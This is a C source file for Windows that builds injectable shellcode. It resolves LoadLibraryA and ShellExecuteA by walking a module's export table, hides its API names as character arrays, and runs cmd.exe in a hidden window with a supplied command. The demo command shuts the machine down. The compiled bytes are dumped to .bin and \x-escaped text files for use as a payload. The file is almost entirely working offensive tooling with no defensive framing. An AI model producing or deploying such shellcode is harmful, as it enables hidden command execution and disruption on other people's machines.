#define	_CRT_SECURE_NO_WARNINGS
#include<stdio.h>
#include<Windows.h>
#include<winternl.h>
#include<wchar.h>
#include<TlHelp32.h>

inline int __stdcall my_strcmpA(const char* str1, const char* str2);
inline int __stdcall my_strcmpW(const wchar_t* str1, const wchar_t str2);
inline SIZE_T __stdcall MyGetProcAddress(HMODULE hModuleBase, LPCSTR lpzFunctionName);

inline int __stdcall START_SHELLCODE(size_t value, const char* command)
{
	HMODULE(__stdcall * MyLoadLibraryA)(LPCSTR);
	char func_LoadLibraryA[] = { 'L','o','a','d','L','i','b','r','a','r','y','A',0 };
	HMODULE kernel32_dll =(HMODULE)value;
	MyLoadLibraryA = (HMODULE(__stdcall*)(LPCSTR))MyGetProcAddress((HMODULE)kernel32_dll, func_LoadLibraryA);

	if (MyLoadLibraryA == 0)
	{
		return -1;
	}
	char szShell32[] = { 's','h','e','l','l','3','2','.','d','l','l',0 };
	char func_ShellExecuteA[] = { 'S','h','e','l','l','E','x','e','c','u','t','e','A',0 };
	char szString1[] = { 'o','p','e','n',0 };
	char szString2[] = { 'c','m','d','.','e','x','e',0 };

	HMODULE hShell32 = MyLoadLibraryA(szShell32);
	HINSTANCE(__stdcall * MyShellExecuteA)(HWND, LPCSTR, LPCSTR, LPCSTR, LPCSTR, INT);
	MyShellExecuteA = (HINSTANCE(__stdcall*)(HWND, LPCSTR, LPCSTR, LPCSTR, LPCSTR, INT))MyGetProcAddress(hShell32, func_ShellExecuteA);
	MyShellExecuteA(NULL, szString1, szString2, command, NULL, SW_HIDE);
	return 0;
}
inline int __stdcall my_strcmpA(const char* str1, const char* str2)
{
	for (; *str1 == *str2; str1++, str2++)
	{
		if (*str1 == 0)
			return 0;
	}
	return (unsigned char*)str1 > (unsigned char*)str2 ? 1 : -1;
}

inline int __stdcall my_strcmpW(const wchar_t* str1, const  wchar_t* str2)
{
	for (; *str1 == *str2; str1++, str2++)
	{
		if (*str1 == 0)
			return 0;
	}
	return (wchar_t*)str1 > (wchar_t*)str2 ? 1 : -1;
}

SIZE_T __stdcall MyGetProcAddress(HMODULE hModuleBase,LPCSTR lpzFunctionName)
{
	SIZE_T		pFunctionAddress = NULL;
	SIZE_T		size = 0;
	PIMAGE_DOS_HEADER	dos = (PIMAGE_DOS_HEADER)hModuleBase;
	PIMAGE_NT_HEADERS	nt = (PIMAGE_NT_HEADERS)((SIZE_T)hModuleBase + dos->e_lfanew);
	PIMAGE_DATA_DIRECTORY	expdir = (PIMAGE_DATA_DIRECTORY)(nt->OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_EXPORT);
	SIZE_T		addr = expdir->VirtualAddress;
	PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)((SIZE_T)hModuleBase + addr);
	PULONG		functions = (PULONG)((SIZE_T)hModuleBase + exports->AddressOfFunctions);
	PSHORT		ordinals = (PSHORT)((SIZE_T)hModuleBase + exports->AddressOfNameOrdinals);
	PULONG		names = (PULONG)((SIZE_T)hModuleBase + exports->AddressOfNames);
	SIZE_T		max_name = exports->NumberOfNames;
	SIZE_T		max_func = exports->NumberOfFunctions;

	for (SIZE_T i = 0; i < max_name; i++)
	{
		SIZE_T ord = ordinals[i];
		if (i >= max_name || ord >= max_func)
		{
			return NULL;
		}
		if (functions[ord] < addr || functions[ord] >= addr + size)
		{
			if (my_strcmpA((PCHAR)hModuleBase + names[i], lpzFunctionName) == 0)
			{
				pFunctionAddress = (SIZE_T)((PCHAR)hModuleBase + functions[ord]);
				break;
			}
		}
	}
	return pFunctionAddress;
}

#ifdef _M_IX86
void __declspec(naked)END_SHELLCODE(void) {}
#elif _M_AMD64
void END_SHELLCODE(void) {}
#endif // _M_IX86

#ifdef _M_IX86
#define BIN_FILE_NAME	"shellcode_x86.bin"
#define	SHELLCODE_FILE_NAME	"shellcode_x86.txt"
#elif _M_AMD64
#define BIN_FILE_NAME	"shellcode_x64.bin"
#define	SHELLCODE_FILE_NAME	"shellcode_x64.txt"
#endif // _M_IX86

int main(void)
{
	size_t value = (size_t)LoadLibraryA("kernel32.dll");
	START_SHELLCODE(value, "/C shutdown -s -t 30>test.txt");

	int sizeofshellcode = (int)END_SHELLCODE - (int)START_SHELLCODE;
	FILE* output_file = fopen(BIN_FILE_NAME, "w");
	fwrite(START_SHELLCODE, (int)END_SHELLCODE - (int)START_SHELLCODE, 1, output_file);
	fclose(output_file);

	FILE* input_file = fopen(BIN_FILE_NAME, "r");
	FILE* output_shell_code = fopen(SHELLCODE_FILE_NAME, "w");

	while (true)
	{
		BYTE data = 0;
		fread(&data, 1, 1, input_file);
		fprintf(output_shell_code, "\\x%02X", data);
		if (feof(input_file))
			break;

	}
	fclose(input_file);
	fclose(output_shell_code);

	return 0;
}













